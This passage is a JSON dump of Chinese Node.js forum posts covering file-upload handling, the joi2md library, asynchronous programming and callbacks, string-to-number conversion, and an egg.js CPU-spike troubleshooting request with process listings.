\n</code></pre><p>然后后台接受到了，速度还挺快。然后我就想使用node来实现一波后台，然后发现用原生的node使用post接受chunk的形式不好使，mutler也不好使，所以请教一下各位有没有这方面的经验或者建议指导学习一下！！！</p>\n</div>","title":"前端上传非FormData格式的文件，node怎么接收处理","last_reply_at":"2019-04-22T03:45:07.405Z","good":false,"top":false,"reply_count":5,"visit_count":1025,"create_at":"2019-04-20T10:03:06.954Z","author":{"loginname":"edisonchan97","avatar_url":"https://avatars0.githubusercontent.com/u/26501047?v=4&s=120"}},{"id":"5cb688a6a86ae80ce64affc7","author_id":"57452aae754d17df1e44d9d7","tab":"share","content":"<div class=\"markdown-text\"><h2>根据Joi 参数判断，去实现文档的request部分，但是总感觉文档用起来还是不是太顺手，求star与提建议。</h2>\n<p>地址：<a href=\"https://github.com/ufo-parts/joi2md\">https://github.com/ufo-parts/joi2md</a>\n<strong>Example</strong></p>\n<pre class=\"prettyprint language-js\"><code>const Joi = require(&#x27;joi&#x27;);\nconst Joi2md = require(&#x27;joi2md&#x27;);\n\nconst Jm = new Joi2md();\n&#x2F;&#x2F; 设置schema\nJm.setSchema({\n    name: Joi.number().default(1).required().notes(&#x27;用户名&#x27;),\n})\n&#x2F;&#x2F; schema 转换为行数据\nJm.transferRows()\n&#x2F;&#x2F; 得到markdown字符串\nJm.setPrintHeaders([\n    [&#x27;path&#x27;, &#x27;参数名&#x27;],\n    [&#x27;type&#x27;, &#x27;类型&#x27;],\n    [&#x27;presence&#x27;, &#x27;必填&#x27;],\n    [&#x27;default&#x27;, &#x27;默认值&#x27;],\n    [&#x27;notes&#x27;, &#x27;说明&#x27;],\n  ]);\nconst result = Jm.printMd()\nconsole.log(result)\n</code></pre><p><strong>Result</strong></p>\n<table>\n<thead>\n<tr>\n<th>参数名</th>\n<th>类型</th>\n<th>必填</th>\n<th>默认值</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>name</td>\n<td>number</td>\n<td>true</td>\n<td><code>1</code></td>\n<td><code>用户名</code></td>\n</tr>\n</tbody>\n</table>\n</div>","title":"joi2md","last_reply_at":"2019-04-22T03:08:34.893Z","good":false,"top":false,"reply_count":9,"visit_count":1320,"create_at":"2019-04-17T02:00:06.140Z","author":{"loginname":"yujintang","avatar_url":"https://avatars3.githubusercontent.com/u/18202085?v=4&s=120"}},{"id":"5cbca71fa86ae80ce64b1a0a","author_id":"5b31b09b57137f22415c4f4a","tab":"share","content":"<div class=\"markdown-text\"><blockquote>\n<p><strong>该文章阅读需要5分钟,更多文章请点击本人博客<a href=\"https://www.halu886.cn\">halu886</a></strong></p>\n</blockquote>\n<ul>\n<li><a href=\"#%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B\">函数式编程</a>\n<ul>\n<li><a href=\"#%E9%AB%98%E9%98%B6%E5%87%BD%E6%95%B0\">高阶函数</a></li>\n<li><a href=\"#%E5%81%8F%E5%87%BD%E6%95%B0%E7%94%A8%E6%B3%95\">偏函数用法</a></li>\n</ul>\n</li>\n<li><a href=\"#%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B%E7%9A%84%E4%BC%98%E5%8A%BF%E5%92%8C%E9%9A%BE%E7%82%B9\">异步编程的优势和难点</a>\n<ul>\n<li><a href=\"#%E4%BC%98%E5%8A%BF\">优势</a></li>\n<li><a href=\"#%E9%9A%BE%E7%82%B9\">难点</a>\n<ul>\n<li><a href=\"#%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86\">异常处理</a></li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<p>之前总结了NodeJs中通过事件循环实现异步，包括各种基于线程池的异步I/O的API和与I/O无关的异步API。NodeJs的设计从里到外都散发着异步的气息。虽然异步为NodeJs带来了卓越的性能，但是异步编程带了部分的诋毁。</p>\n<p>同时之前我们也总结过异步开发在应用层流行不起来的原因。逻辑上，异步编程在流程控制上，业务表达并不适合自然语言的线形思维习惯。较少人能适应异步编程，除了GUI开发者,前端开发者习以为常处理各种DOM事件和浏览器中的事件。</p>\n<p>Javascript在浏览器中也属于事件驱动的执行过程，这使得前后端的Javascript在执行原理和风格上趋近一致，虽然执行在不同的环境，但是除了宿主环境不一样，并不能让人觉得这是一门新语言。</p>\n<p>V8和异步带来的性能提升，前后端Javascript编程分隔一致，是Node能迅速成功并流行起来的原因。</p>\n<h1>函数式编程</h1>\n<p>在开始异步编程之前，我们先来了解一下Javascript的回调函数和深层嵌套的来龙去脉，函数（function）作为Javascript的一等公民，自由度非常高，无论是作为调用还是参数，甚至返回值均可。这是因为Javascript在诞生时借鉴了Schema语言（lisp的派生）。</p>\n<h2>高阶函数</h2>\n<p>一般来说，函数只接受一般的基本的数据类型或者对象引用，返回值也是基本数据类型和对象引用。</p>\n<pre class=\"prettyprint language-js\"><code>function foo(x){\n    return x;\n}\n</code></pre><p>高阶函数则是可以将函数作为返回值，或者将函数作为参数的函数。</p>\n<pre class=\"prettyprint language-js\"><code>function foo(){\n    return function(){\n        return x;\n    }\n}\n</code></pre><p>高阶函数看起来变化虽小。像C/C++也能通过指针实现，但是形成了一种后续传递风格（Continue Passing Style）的结果接收方式，将函数的业务重心从返回值转移到了回调函数中。</p>\n<pre class=\"prettyprint language-js\"><code>function foo(x,bar){\n    return bar(x);\n}\n</code></pre><p>以上面的高阶函数作为例子，当bar参数不同时，则返回不同结果。例如数组的<code>sorting()</code>则是典型的高阶函数。</p>\n<pre class=\"prettyprint language-js\"><code>var points=[40,100,1,5,25,10];\npoints.sort(function(a,b){\n    return a - b;\n})\n&#x2F;&#x2F; [1,5,10,25,40,100]\n</code></pre><p>通过改动回调函数来决定业务这就是高阶函数的灵活性，同时结合Node的事件模块，事件处理方式正是基于高阶函数的特性来完成的，相同的事件注册不同的回调函数灵活的处理业务逻辑。</p>\n<pre class=\"prettyprint language-js\"><code>var emitter = new events.EventEmitter();\nemitter.on(&#x27;event_foo&#x27;,function(){\n    &#x2F;&#x2F; TODO\n})\n</code></pre><p>事件可以很容易的将复杂业务解耦，这都归功于高阶函数，高阶函数在Javascript中比比皆是。</p>\n<h2>偏函数用法</h2>\n<p>偏函数指的是创建一个调用一个-部分参数或变量已经预设的函数-的函数。</p>\n<p>例如：</p>\n<pre class=\"prettyprint language-js\"><code>var toString = Object.prototype.toString;\n\nvar isString = function(obj){\n    return toString.call(obj) == &#x27;[object String]&#x27;;\n}\nvar isFunction = function(obj){\n    return toString.call(obj)==&#x27;[object Function]&#x27;;\n}\n</code></pre><p>在Javascript中进行类型判断时，我们通常会用上述方法定义。虽然不是很复杂，只有两个函数的定义，但是存在一些重复的代码。一旦类型多起来，那么会出现更多的冗余代码。为了解决重复定义的问题，我们引入一个新函数如工厂一样批量创建类似的函数。</p>\n<pre class=\"prettyprint language-js\"><code>var isType = function(type){\n    return function(obj){\n        return toString.call(obj)==&#x27;[object &#x27; + type + &#x27;]&#x27;;\n    };\n}\n\nvar isString = isType(&#x27;String&#x27;);\nvar isFunction = isType(&#x27;Function&#x27;);\n</code></pre><p>可以看出，通过创建<code>isType()</code>函数后，后面创建类型校验的方法就简单多了。这种通过指定部分参数产生新的定制化的函数的形式就是偏函数。</p>\n<p>偏函数在异步编程中应用也十分广泛，著名类库Underscore提供的after()方法就是偏函数应用。</p>\n<pre class=\"prettyprint language-js\"><code>_.after = function(times,func){\n    if(times&lt;=0) return func();\n    return function(){\n        if (--times &lt; 1) {return func.apply(this,arguments);}\n    }\n}\n</code></pre><p>根据传入的times和具体方法，生成一个需要执行多次才会执行的偏函数。</p>\n<h1>异步编程的优势和难点</h1>\n<p>在单线程中，由于同步I/O耗时太久，导致I/O和CPU使用不能重叠。可是随着应用的复杂度和性能门槛提高，开发者过去通过使用多线程来提升性能，但是随之而来的上下文切换开销以及锁和同步等各种问题让开发者头痛不已。或者C/C++直接调用操作系统底层，手工实现异步I/O，但是开发和调试的门槛也随之提升。Node利用Javascript及内部异步库将异步提升应用层,这是种创新。</p>\n<h2>优势</h2>\n<p>Node的核心是基于事件驱动的非阻塞I/O模型，使得I/O和CPU并不相互依赖，让资源更好的利用。对于网络应用，并发带来的想象空间更大，延展开来的是分布式和云， 并行使得各个单点之间可以有效的连接组织起来。</p>\n<p><img src=\"http://resource.halu886.cn/images/async-code-1/1.png?x-oss-process=style/halu-blog-watermark\" alt=\"1\"></p>\n<p>传统同步模型中，分布式计算性能则会大打折扣。</p>\n<p><img src=\"http://resource.halu886.cn/images/async-code-1/2.png?x-oss-process=style/halu-blog-watermark\" alt=\"2\"></p>\n<p>Node的JavaScript线程则像是一个大管家，将任务分配给I/O线程和处理结果，I/O线程池中的I/O线程则是作为小二的角色。管家和小二则是互不相关的，这保证了整体的高效。</p>\n<p>这个模型的缺陷则是管家无法承担过多的细节性的工作。如果承担过多，则会影响任务的调度。管家将忙个不停，而小二则得不到活干。结果是整体效率的低下。</p>\n<p>Node是处理I/O密集型的模型，采用单线程，则使Node更像一个处理I/O密集型的能手，对于CPU密集型则看这个大管家的能耐了。</p>\n<h2>难点</h2>\n<p>Node让异步编程风靡服务器端，一方面借助异步I/O和V8引擎的高性能突破单线程性能瓶颈，另一方面统一了前后端Javascript编程模型。但是也存在很多难点。</p>\n<h3>异常处理</h3>\n<p>之前我们捕获异常通过类Java的try/catch/final语句块。</p>\n<pre class=\"prettyprint language-js\"><code>try{\n    JSON.parse(json);\n}catch(e){\n    &#x2F;&#x2F;TODO\n}\n</code></pre><p>但是异步I/O通常分为两步，提交请求和处理结果，两个阶段存在事件循环调度。异步方法通常在发起调用立即返回，异常不一定发生在调用的过程中，那么此时try/catch的功效在这里是不会发生任何作用。</p>\n<pre class=\"prettyprint language-js\"><code>var async = function(callback){\n    process.nextTick(callback);\n}\n</code></pre><p>调用async方法后，callback将会被存放起来，将会在下个事件循环Tick中被取出执行。尝试对异步方法进行try/catch只能捕获当此Tick循环中异常，回调中抛出的异常则无法捕获了。</p>\n<pre class=\"prettyprint language-js\"><code>try{\n    async(callback);\n}catch(e){\n    &#x2F;&#x2F;TODO\n}\n</code></pre><p>Node在处理异常时有一种约定俗成的习俗，将异常作为作为回调的第一个实参。如果为空，则表示没有异常。</p>\n<pre class=\"prettyprint language-js\"><code>async(function(err,results){\n    &#x2F;&#x2F;TODO;\n})\n</code></pre><p>如果是我们自行创建的异步方法，也需要遵循以下两点</p>\n<ol>\n<li>必须执行调用方传入的回调函数;</li>\n<li>正确传递异常供调用者判断;</li>\n</ol>\n<pre class=\"prettyprint language-js\"><code>var async = function(callback){\n    process.nextTick(function(){\n        var results = something;\n        if(error){\n            return callback(error);\n        }\n        callback(null,result);\n    })\n}\n</code></pre><p>另一个容易犯的错误则是对用户传递的回调进行异常捕获。</p>\n<pre class=\"prettyprint language-js\"><code>try{\n    req.body = JSON.parse(buf,options.reviver);\n    callback();\n}catch(err){\n   err.body = buf;\n   err.status = 400;\n   callback(err);\n}\n</code></pre><p>上述代码的意图本是捕获<code>JSON.parse()</code>抛出的异常，但是也将<code>callback()</code>包含进去了，一旦回调函数出现异常，那么将会被catch，则又被执行一次，将会造成业务混乱。</p>\n<pre class=\"prettyprint language-js\"><code>try{\n    req.body = JSON.parse(buf,options.reviver);\n}catch(err){\n    err.body = buf;\n    err.status = 400;\n    return callback(err);\n}\ncallback();\n</code></pre><p>在编写异步方法，只需要将异常正常的传递给用户的回调即可，无需做过多的操作。</p>\n<blockquote>\n<p>以上知识点均来自&lt;&lt;深入浅出Node.js&gt;&gt;，更多细节建议阅读书籍:-)</p>\n</blockquote>\n</div>","title":"异步编程总结-1","last_reply_at":"2019-04-21T17:23:43.948Z","good":false,"top":false,"reply_count":0,"visit_count":506,"create_at":"2019-04-21T17:23:43.948Z","author":{"loginname":"halu886","avatar_url":"https://avatars1.githubusercontent.com/u/22374024?v=4&s=120"}},{"id":"5cbb6898a86ae80ce64b1796","author_id":"5cbb652337faec0ce1d04175","tab":"share","content":"<div class=\"markdown-text\"><p>Javascript是一种很棒的语言。 我们可以用很多不同的方式做事。</p>\n<p><strong>parseInt()</strong></p>\n<pre class=\"prettyprint\"><code>console.log(parseInt(&#x27;123&#x27;)); &#x2F;&#x2F; 产量: 123\nconsole.log(parseInt(&#x27;123.45&#x27;)); &#x2F;&#x2F; 产量: 123\n</code></pre><p><strong>parseFloat()</strong></p>\n<pre class=\"prettyprint\"><code>console.log(parseFloat(&#x27;123&#x27;)); &#x2F;&#x2F; 产量: 123\nconsole.log(parseFloat(&#x27;123.45&#x27;)); &#x2F;&#x2F; 产量: 123.45\n</code></pre><p><strong>Number()</strong></p>\n<pre class=\"prettyprint\"><code>console.log(Number(&#x27;123&#x27;)); &#x2F;&#x2F; 产量: 123\nconsole.log(Number(&#x27;123.45&#x27;)); &#x2F;&#x2F; 产量: 123.45\n</code></pre><p><strong>用数字乘以字符串</strong></p>\n<pre class=\"prettyprint\"><code>console.log(&#x27;123&#x27; * 1); &#x2F;&#x2F; 产量: 123\nconsole.log(&#x27;123.45&#x27; * 1); &#x2F;&#x2F; 产量: 123.45\n</code></pre><p>一元加法</p>\n<pre class=\"prettyprint\"><code>console.log(+&#x27;123&#x27;); &#x2F;&#x2F; 产量: 123\nconsole.log(+&#x27;123.45&#x27;); &#x2F;&#x2F; 产量: 123.45\n</code></pre><p>原版的：<a href=\"https://embarkcode.com/javascript-convert-string-to-number/\">JavaScript Convert String to Number</a></p>\n</div>","title":"JavaScript将字符串转换为数字","last_reply_at":"2019-04-21T02:27:19.265Z","good":false,"top":false,"reply_count":2,"visit_count":992,"create_at":"2019-04-20T18:44:40.462Z","author":{"loginname":"AbuzerAsif","avatar_url":"https://avatars3.githubusercontent.com/u/11502830?v=4&s=120"}},{"id":"5cb97a10a86ae80ce64b1224","author_id":"58de5214b3e60b982d089dc3","tab":"ask","content":"<div class=\"markdown-text\"><p>问题简述: 今天凌晨0点3台应用机器cpu爆炸, 持续了几个小时(之后也不是应用自己恢复正常的). 猜想是不是跟日志有关? 前一天清空了应用日志目录.\n<img src=\"//static.cnodejs.org/FtR6gTu3y8vBmEoSHIpdMIcGw1lF\" alt=\"image.png\">\n机器配置: 4cpu x 3台k8s节点机器.\n应用规模: 3台机器跑了大约50个egg k8s pod, 每个应用跑2个pod.\n日志写入: 如果一个应用的2个pod落在同一个机器上, 会写相同的日志文件. (单个pod实例里4个egg worker是不是也存在这样的情况?)\n启动方式: pod里面用egg-scripts start --daemon运行起来的.</p>\n<p>初步排查结果, cpu暴涨的node进程都是egg worker:\n<img src=\"//static.cnodejs.org/FpNRu51LHuQW8ZqmUyYo4dJMzJ4k\" alt=\"image.png\"></p>\n<pre class=\"prettyprint\"><code>1111 ?        Rl     0:13 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;node --require &#x2F;usr&#x2F;local&#x2F;lib&#x2F;node_modules&#x2F;egg-scripts&#x2F;node_modules&#x2F;source-map-support&#x2F;register.js &#x2F;app&#x2F;node_modules&#x2F;egg-cluster&#x2F;lib&#x2F;app_worker.js {&quot;framework&quot;:&quot;&#x2F;app&#x2F;node_modules&#x2F;egg&quot;,&quot;baseDir&quot;:&quot;&#x2F;app&quot;,&quot;workers&quot;:4,&quot;plugins&quot;:null,&quot;https&quot;:false,&quot;title&quot;:&quot;*************&quot;,&quot;clusterPort&quot;:35401}\n1566 ?        Rl     0:06 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;node --require &#x2F;usr&#x2F;local&#x2F;lib&#x2F;node_modules&#x2F;egg-scripts&#x2F;node_modules&#x2F;source-map-support&#x2F;register.js &#x2F;app&#x2F;node_modules&#x2F;egg-cluster&#x2F;lib&#x2F;app_worker.js {&quot;framework&quot;:&quot;&#x2F;app&#x2F;node_modules&#x2F;egg&quot;,&quot;baseDir&quot;:&quot;&#x2F;app&quot;,&quot;workers&quot;:4,&quot;plugins&quot;:null,&quot;https&quot;:false,&quot;title&quot;:&quot;*************&quot;,&quot;clusterPort&quot;:39980}\n1610 ?        Rl     0:10 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;node --require &#x2F;usr&#x2F;local&#x2F;lib&#x2F;node_modules&#x2F;egg-scripts&#x2F;node_modules&#x2F;source-map-support&#x2F;register.js &#x2F;app&#x2F;node_modules&#x2F;egg-cluster&#x2F;lib&#x2F;app_worker.js {&quot;framework&quot;:&quot;&#x2F;app&#x2F;node_modules&#x2F;egg&quot;,&quot;baseDir&quot;:&quot;&#x2F;app&quot;,&quot;workers&quot;:4,&quot;plugins&quot;:null,&quot;https&quot;:false,&quot;title&quot;:&quot;*************&quot;,&quot;clusterPort&quot;:42591}\n1667 ?        Sl     0:07 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;node --require &#x2F;usr&#x2F;local&#x2F;lib&#x2F;node_modules&#x2F;egg-scripts&#x2F;node_modules&#x2F;source-map-support&#x2F;register.js &#x2F;app&#x2F;node_modules&#x2F;egg-cluster&#x2F;lib&#x2F;app_worker.js {&quot;framework&quot;:&quot;&#x2F;app&#x2F;node_modules&#x2F;egg&quot;,&quot;baseDir&quot;:&quot;&#x2F;app&quot;,&quot;workers&quot;:4,&quot;plugins&quot;:null,&quot;https&quot;:false,&quot;title&quot;:&quot;*************&quot;,&quot;clusterPort&quot;:46809}\n2222 ?        Rl     0:06 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;node --require &#x2F;usr&#x2F;local&#x2F;lib&#x2F;node_modules&#x2F;egg-scripts&#x2F;node_modules&#x2F;source-map-support&#x2F;register.js &#x2F;app&#x2F;node_modules&#x2F;egg-cluster&#x2F;lib&#x2F;agent_worker.js {&quot;framework&quot;:&quot;&#x2F;app&#x2F;node_modules&#x2F;egg&quot;,&quot;baseDir&quot;:&quot;&#x2F;app&quot;,&quot;workers&quot;:4,&quot;plugins&quot;:null,&quot;https&quot;:false,&quot;title&quot;:&quot;*************&quot;,&quot;clusterPort&quot;:35401}\n2349 ?        Rl     0:04 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;node --require &#x2F;usr&#x2F;local&#x2F;lib&#x2F;node_modules&#x2F;egg-scripts&#x2F;node_modules&#x2F;source-map-support&#x2F;register.js &#x2F;app&#x2F;node_modules&#x2F;egg-cluster&#x2F;lib&#x2F;app_worker.js {&quot;framework&quot;:&quot;&#x2F;app&#x2F;node_modules&#x2F;egg&quot;,&quot;baseDir&quot;:&quot;&#x2F;app&quot;,&quot;workers&quot;:4,&quot;plugins&quot;:null,&quot;https&quot;:false,&quot;title&quot;:&quot;*************&quot;,&quot;clusterPort&quot;:46809}\n2529 ?        Rl     0:04 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;node --require &#x2F;usr&#x2F;local&#x2F;lib&#x2F;node_modules&#x2F;egg-scripts&#x2F;node_modules&#x2F;source-map-support&#x2F;register.js &#x2F;app&#x2F;node_modules&#x2F;egg-cluster&#x2F;lib&#x2F;agent_worker.js {&quot;framework&quot;:&quot;&#x2F;app&#x2F;node_modules&#x2F;egg&quot;,&quot;baseDir&quot;:&quot;&#x2F;app&quot;,&quot;workers&quot;:4,&quot;plugins&quot;:null,&quot;https&quot;:false,&quot;title&quot;:&quot;*************&quot;,&quot;clusterPort&quot;:42591}\n9716 ?        Rl     3:28 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;node --require &#x2F;usr&#x2F;local&#x2F;lib&#x2F;node_modules&#x2F;egg-scripts&#x2F;node_modules&#x2F;source-map-support&#x2F;register.js &#x2F;app&#x2F;node_modules&#x2F;egg-cluster&#x2F;lib&#x2F;app_worker.js {&quot;framework&quot;:&quot;&#x2F;app&#x2F;node_modules&#x2F;egg&quot;,&quot;baseDir&quot;:&quot;&#x2F;app&quot;,&quot;workers&quot;:4,&quot;plugins&quot;:null,&quot;https&quot;:false,&quot;title&quot;:&quot;*************&quot;,&quot;clusterPort&quot;:39980}\n18599 ?        Rl     5:36 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;node --require &#x2F;usr&#x2F;local&#x2F;lib&#x2F;node_modules&#x2F;egg-scripts&#x2F;node_modules&#x2F;source-map-support&#x2F;register.js &#x2F;app&#x2F;node_modules&#x2F;egg-cluster&#x2F;lib&#x2F;agent_worker.js {&quot;framework&quot;:&quot;&#x2F;app&#x2F;node_modules&#x2F;egg&quot;,&quot;baseDir&quot;:&quot;&#x2F;app&quot;,&quot;workers&quot;:4,&quot;plugins&quot;:null,&quot;https&quot;:false,&quot;title&quot;:&quot;*************&quot;,&quot;clusterPort&quot;:43367}\n18768 ?        Rl     5:31 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;node --require &#x2F;usr&#x2F;local&#x2F;lib&#x2F;node_modules&#x2F;egg-scripts&#x2F;node_modules&#x2F;source-map-support&#x2F;register.js &#x2F;app&#x2F;node_modules&#x2F;egg-cluster&#x2F;lib&#x2F;app_worker.js {&quot;framework&quot;:&quot;&#x2F;app&#x2F;node_modules&#x2F;egg&quot;,&quot;baseDir&quot;:&quot;&#x2F;app&quot;,&quot;workers&quot;:4,&quot;plugins&quot;:null,&quot;https&quot;:false,&quot;title&quot;:&quot;*************&quot;,&quot;clusterPort&quot;:43367}\n18781 ?        Rl     5:37 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;node --require &#x2F;usr&#x2F;local&#x2F;lib&#x2F;node_modules&#x2F;egg-scripts&#x2F;node_modules&#x2F;source-map-support&#x2F;register.js &#x2F;app&#x2F;node_modules&#x2F;egg-cluster&#x2F;lib&#x2F;app_worker.js {&quot;framework&quot;:&quot;&#x2F;app&#x2F;node_modules&#x2F;egg&quot;,&quot;baseDir&quot;:&quot;&#x2F;app&quot;,&quot;workers&quot;:4,&quot;plugins&quot;:null,&quot;https&quot;:false,&quot;title&quot;:&quot;*************&quot;,&quot;clusterPort&quot;:43367}\n18783 ?        Rl     7:42 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;node --require &#x2F;usr&#x2F;local&#x2F;lib&#x2F;node_modules&#x2F;egg-scripts&#x2F;node_modules&#x2F;source-map-support&#x2F;register.js &#x2F;app&#x2F;node_modules&#x2F;egg-cluster&#x2F;lib&#x2F;agent_worker.js {&quot;framework&quot;:&quot;&#x2F;app&#x2F;node_modules&#x2F;egg&quot;,&quot;baseDir&quot;:&quot;&#x2F;app&quot;,&quot;workers&quot;:4,&quot;plugins&quot;:null,&quot;https&quot;:false,&quot;title&quot;:&quot;*************&quot;,&quot;clusterPort&quot;:37730}\n18871 ?        Rl     7:04 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;node --require &#x2F;usr&#x2F;local&#x2F;lib&#x2F;node_modules&#x2F;egg-scripts&#x2F;node_modules&#x2F;source-map-support&#x2F;register.js &#x2F;app&#x2F;node_modules&#x2F;egg-cluster&#x2F;lib&#x2F;app_worker.js {&quot;framework&quot;:&quot;&#x2F;app&#x2F;node_modules&#x2F;egg&quot;,&quot;baseDir&quot;:&quot;&#x2F;app&quot;,&quot;workers&quot;:4,&quot;plugins&quot;:null,&quot;https&quot;:false,&quot;title&quot;:&quot;*************&quot;,&quot;clusterPort&quot;:37730}\n18873 ?        Rl     7:11 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;node --require &#x2F;usr&#x2F;local&#x2F;lib&#x2F;node_modules&#x2F;egg-scripts&#x2F;node_modules&#x2F;source-map-support&#x2F;register.js &#x2F;app&#x2F;node_modules&#x2F;egg-cluster&#x2F;lib&#x2F;app_worker.js {&quot;framework&quot;:&quot;&#x2F;app&#x2F;node_modules&#x2F;egg&quot;,&quot;baseDir&quot;:&quot;&#x2F;app&quot;,&quot;workers&quot;:4,&quot;plugins&quot;:null,&quot;https&quot;:false,&quot;title&quot;:&quot;*************&quot;,&quot;clusterPort&quot;:37730}\n18878 ?        Rl     7:08 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;node --require &#x2F;usr&#x2F;local&#x2F;lib&#x2F;node_modules&#x2F;egg-scripts&#x2F;node_modules&#x2F;source-map-support&#x2F;register.js &#x2F;app&#x2F;node_modules&#x2F;egg-cluster&#x2F;lib&#x2F;app_worker.js {&quot;framework&quot;:&quot;&#x2F;app&#x2F;node_modules&#x2F;egg&quot;,&quot;baseDir&quot;:&quot;&#x2F;app&quot;,&quot;workers&quot;:4,&quot;plugins&quot;:null,&quot;https&quot;:false,&quot;title&quot;:&quot;*************&quot;,&quot;clusterPort&quot;:37730}\n18888 ?        Rl     6:58 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;node --require &#x2F;usr&#x2F;local&#x2F;lib&#x2F;node_modules&#x2F;egg-scripts&#x2F;node_modules&#x2F;source-map-support&#x2F;register.js &#x2F;app&#x2F;node_modules&#x2F;egg-cluster&#x2F;lib&#x2F;app_worker.js {&quot;framework&quot;:&quot;&#x2F;app&#x2F;node_modules&#x2F;egg&quot;,&quot;baseDir&quot;:&quot;&#x2F;app&quot;,&quot;workers&quot;:4,&quot;plugins&quot;:null,&quot;https&quot;:false,&quot;title&quot;:&quot;*************&quot;,&quot;clusterPort&quot;:37730}\n19292 ?        Rl     6:04 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;node --require &#x2F;usr&#x2F;local&#x2F;lib&#x2F;node_modules&#x2F;egg-scripts&#x2F;node_modules&#x2F;source-map-support&#x2F;register.js &#x2F;app&#x2F;node_modules&#x2F;egg-cluster&#x2F;lib&#x2F;agent_worker.js {&quot;framework&quot;:&quot;&#x2F;app&#x2F;node_modules&#x2F;egg&quot;,&quot;baseDir&quot;:&quot;&#x2F;app&quot;,&quot;workers&quot;:4,&quot;plugins&quot;:null,&quot;https&quot;:false,&quot;title&quot;:&quot;*************&quot;,&quot;clusterPort&quot;:42728}\n19324 ?        Rl     5:05 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;node --require &#x2F;usr&#x2F;local&#x2F;lib&#x2F;node_modules&#x2F;egg-scripts&#x2F;node_modules&#x2F;source-map-support&#x2F;register.js &#x2F;app&#x2F;node_modules&#x2F;egg-cluster&#x2F;lib&#x2F;app_worker.js {&quot;framework&quot;:&quot;&#x2F;app&#x2F;node_modules&#x2F;egg&quot;,&quot;baseDir&quot;:&quot;&#x2F;app&quot;,&quot;workers&quot;:4,&quot;plugins&quot;:null,&quot;https&quot;:false,&quot;title&quot;:&quot;*************&quot;,&quot;clusterPort&quot;:42728}\n19325 ?        Rl     5:06 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;node --require &#x2F;usr&#x2F;local&#x2F;lib&#x2F;node_modules&#x2F;egg-scripts&#x2F;node_modules&#x2F;source-map-support&#x2F;register.js &#x2F;app&#x2F;node_modules&#x2F;egg-cluster&#x2F;lib&#x2F;app_worker.js {&quot;framework&quot;:&quot;&#x2F;app&#x2F;node_modules&#x2F;egg&quot;,&quot;baseDir&quot;:&quot;&#x2F;app&quot;,&quot;workers&quot;:4,&quot;plugins&quot;:null,&quot;https&quot;:false,&quot;title&quot;:&quot;*************&quot;,&quot;clusterPort&quot;:42728}\n19331 ?        Rl     5:04 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;node --require &#x2F;usr&#x2F;local&#x2F;lib&#x2F;node_modules&#x2F;egg-scripts&#x2F;node_modules&#x2F;source-map-support&#x2F;register.js &#x2F;app&#x2F;node_modules&#x2F;egg-cluster&#x2F;lib&#x2F;app_worker.js {&quot;framework&quot;:&quot;&#x2F;app&#x2F;node_modules&#x2F;egg&quot;,&quot;baseDir&quot;:&quot;&#x2F;app&quot;,&quot;workers&quot;:4,&quot;plugins&quot;:null,&quot;https&quot;:false,&quot;title&quot;:&quot;*************&quot;,&quot;clusterPort&quot;:42728}\n19344 ?        Rl     5:01 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;node --require &#x2F;usr&#x2F;local&#x2F;lib&#x2F;node_modules&#x2F;egg-scripts&#x2F;node_modules&#x2F;source-map-support&#x2F;register.js &#x2F;app&#x2F;node_modules&#x2F;egg-cluster&#x2F;lib&#x2F;app_worker.js {&quot;framework&quot;:&quot;&#x2F;app&#x2F;node_modules&#x2F;egg&quot;,&quot;baseDir&quot;:&quot;&#x2F;app&quot;,&quot;workers&quot;:4,&quot;plugins&quot;:null,&quot;https&quot;:false,&quot;title&quot;:&quot;*************&quot;,&quot;clusterPort&quot;:42728}\n20639 ?        Rl     4:58 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;node --require &#x2F;usr&#x2F;local&#x2F;lib&#x2F;node_modules&#x2F;egg-scripts&#x2F;node_modules&#x2F;source-map-support&#x2F;register.js &#x2F;app&#x2F;node_modules&#x2F;egg-cluster&#x2F;lib&#x2F;app_worker.js {&quot;framework&quot;:&quot;&#x2F;app&#x2F;node_modules&#x2F;egg&quot;,&quot;baseDir&quot;:&quot;&#x2F;app&quot;,&quot;workers&quot;:4,&quot;plugins&quot;:null,&quot;https&quot;:false,&quot;title&quot;:&quot;*************&quot;,&quot;clusterPort&quot;:39980}\n21635 ?        Rl     2:50 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;node --require &#x2F;usr&#x2F;local&#x2F;lib&#x2F;node_modules&#x2F;egg-scripts&#x2F;node_modules&#x2F;source-map-support&#x2F;register.js &#x2F;app&#x2F;node_modules&#x2F;egg-cluster&#x2F;lib&#x2F;app_worker.js {&quot;framework&quot;:&quot;&#x2F;app&#x2F;node_modules&#x2F;egg&quot;,&quot;baseDir&quot;:&quot;&#x2F;app&quot;,&quot;workers&quot;:4,&quot;plugins&quot;:null,&quot;https&quot;:false,&quot;title&quot;:&quot;*************&quot;,&quot;clusterPort&quot;:39980}\n26413 ?        Rl     5:29 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;node --require &#x2F;usr&#x2F;local&#x2F;lib&#x2F;node_modules&#x2F;egg-scripts&#x2F;node_modules&#x2F;source-map-support&#x2F;register.js 